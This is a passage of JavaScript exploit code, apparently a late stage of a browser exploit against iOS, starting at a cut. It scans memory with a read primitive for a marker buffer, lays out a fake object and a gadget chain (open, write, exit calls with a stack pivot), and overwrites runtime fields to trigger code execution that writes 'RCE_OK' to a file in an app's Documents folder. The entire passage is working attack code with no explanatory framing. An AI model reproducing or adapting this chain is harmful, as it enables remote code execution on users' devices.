nt */
var MAG=0x1122334455667788n;
var UB=new Uint8Array(2048);for(var i0=0;i0<2048;i0++)UB[i0]=0;put64_(UB,0x400,MAG);
var U=0n,lim=0x10000n,off;
for(off=b;off<b+lim;off+=8n){var w=_ (off);if((w&0xffffffffn)===2048n){var p=_(off+16n);var pq=p&0x00ffffffffffffffn;if(pq>0x10000n&&pq<0x0001000000000000n&&0n===(7n&p)){try{if(_(p+0x400n)===MAG){U=p;break;}}catch(e){}}}}
if(U===0n){for(off=b-8n;off>b-lim;off-=8n){var w2=_(off);if((w2&0xffffffffn)===2048n){var p2=_(off+16n);var pq2=p2&0x00ffffffffffffffn;if(pq2>0x10000n&&pq2<0x0001000000000000n&&0n===(7n&p2)){try{if(_(p2+0x400n)===MAG){U=p2;break;}}catch(e){}}}}}
if(U===0n){i("U_NF D="+a(b));return;}
var PATH='/private/var/mobile/Containers/Data/Application/00000000-0000-0000-0000-000000000000/Documents/rce.txt';
var MSG='RCE_OK\n';
function a8(x){return(x+7)&~7;}
var oPath=0,oMsg=a8(oPath+PATH.length+1),oA0=a8(oMsg+MSG.length+1),oB0=oA0+0x40,oA1=oB0+0x40,oB1=oA1+0x40,oEnd=oB1+0x40;
for(var z=0;z<oEnd;z++)UB[z]=0;
for(var z2=0;z2<PATH.length;z2++)UB[oPath+z2]=PATH.charCodeAt(z2)&0xff;
for(var z3=0;z3<MSG.length;z3++)UB[oMsg+z3]=MSG.charCodeAt(z3)&0xff;
UB[oA0+0x10]=0x01;UB[oA0+0x11]=0x06;UB[oA0+0x18]=0xa4;UB[oA0+0x19]=0x01;
put64_(UB,oB0+0x28,U+BigInt(oPath));put64_(UB,oA1+0x10,U+BigInt(oMsg));UB[oA1+0x18]=MSG.length;
var TRIG=new Uint8Array(0x400);for(var i1=0;i1<0x400;i1++)TRIG[i1]=0;
put64_(TRIG,0x08,U+BigInt(oB0));put64_(TRIG,0x10,G_LOAD);put64_(TRIG,0x18,U+BigInt(oA0));
put64_(TRIG,0xB8,U+BigInt(oB0));put64_(TRIG,0xD0,OPEN);put64_(TRIG,0xE0,G_X0);
put64_(TRIG,0xF0,G_LOAD);put64_(TRIG,0xF8,U+BigInt(oA1));put64_(TRIG,0x110,G_CALL);
put64_(TRIG,0x1A0,WRITE);put64_(TRIG,0x1C0,G_CALL);put64_(TRIG,0x248,U+BigInt(oB1));
put64_(TRIG,0x260,PEXIT);put64_(TRIG,0x270,G_X0);
i("U_RDY "+a(U)+" PATH="+PATH);
if(HOSTCFG){return;}
var RT_FREE=d+16n,RT_USABLE=d+32n,RT_SIZE=d+48n,RT_OPAQUE=d+64n;
var HUGE=0xffffffffffffffffn,ZERO=0n;
h(RT_FREE,G_CALL);h(RT_OPAQUE,ZERO);h(RT_USABLE,PIVOT2);h(RT_SIZE,HUGE);
TRIG=null;
i("U_AFTER");
u()}();